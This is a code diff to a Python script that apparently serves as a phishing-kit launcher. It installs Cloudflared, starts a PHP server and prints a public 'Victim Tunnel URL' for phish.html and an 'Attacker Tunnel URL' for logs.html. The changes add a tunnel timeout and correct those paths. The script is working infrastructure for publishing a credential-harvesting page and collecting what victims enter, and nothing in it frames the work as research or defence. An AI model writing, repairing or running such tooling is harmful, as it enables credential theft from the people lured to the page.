@@ -3,6 +3,7 @@ import json
 import subprocess
 import platform
 import shutil
+import time
 
 CONFIG_FILE = "config.json"
 
@@ -71,7 +72,7 @@ def install_cloudflared():
     print("[*] Cloudflared installed successfully.")
 
 # Start Cloudflared and parse the tunnel URL
-def start_cloudflared(port):
+def start_cloudflared(port, timeout=30):
     cloudflared_path = ".server/cloudflared"
     if not os.path.exists(cloudflared_path):
         print("[!] Cloudflared binary is missing. Attempting to reinstall...")
@@ -79,6 +80,7 @@ def start_cloudflared(port):
 
     print("[*] Starting Cloudflared...")
     tunnel_url = None
+    start_time = time.time()
     try:
         process = subprocess.Popen(
             [cloudflared_path, "tunnel", "--url", f"http://127.0.0.1:{port}"],
@@ -88,14 +90,14 @@ def start_cloudflared(port):
         )
 
         for line in process.stdout:
-            print(f"[Cloudflared Log] {line.strip()}")  # Log each line for debugging
+            print(f"[Cloudflared Log] {line.strip()}")
             if "trycloudflare.com" in line:
                 tunnel_url = line.split(" ")[-1].strip()
                 break
-        else:
-            print("[!] Tunnel URL not found. Falling back to manual URL creation.")
-            stderr_output = process.stderr.read()
-            print(f"[Cloudflared Error Log] {stderr_output.strip()}")
+            if time.time() - start_time > timeout:
+                print("[!] Cloudflared timed out. Please check your network or configuration.")
+                process.terminate()
+                break
 
     except Exception as e:
         print(f"[!] An error occurred while starting Cloudflared: {e}")
@@ -105,8 +107,8 @@ def start_cloudflared(port):
 # Generate URLs for Victim and Attacker
 def generate_urls(port):
     base_url = f"http://127.0.0.1:{port}"
-    victim_url = f"{base_url}/phish"  # Example victim URL
-    attacker_url = f"{base_url}/logs"  # Example attacker URL
+    victim_url = f"{base_url}/phish.html"  # Updated to match existing file
+    attacker_url = f"{base_url}/logs.html"  # Updated to match existing file
     return victim_url, attacker_url
 
 # Start a PHP server
@@ -135,8 +137,8 @@ def main_menu():
         start_php_server(port)
         tunnel_url = start_cloudflared(port)
         if tunnel_url:
-            print(f"[+] Victim Tunnel URL: {tunnel_url}")
-            print(f"[+] Attacker Tunnel URL: {tunnel_url}/logs")
+            print(f"[+] Victim Tunnel URL: {tunnel_url}/phish.html")
+            print(f"[+] Attacker Tunnel URL: {tunnel_url}/logs.html")
         else:
             print("[!] Unable to create Cloudflared tunnel.")
     elif choice == "3":
@@ -146,7 +148,7 @@ def main_menu():
         print("[!] Invalid choice. Exiting.")
 
 if __name__ == "__main__":
-    display_banner()  # Call the banner function
+    display_banner()
     if not os.path.exists(".server/www"):
         os.makedirs(".server/www")
     check_dependencies()
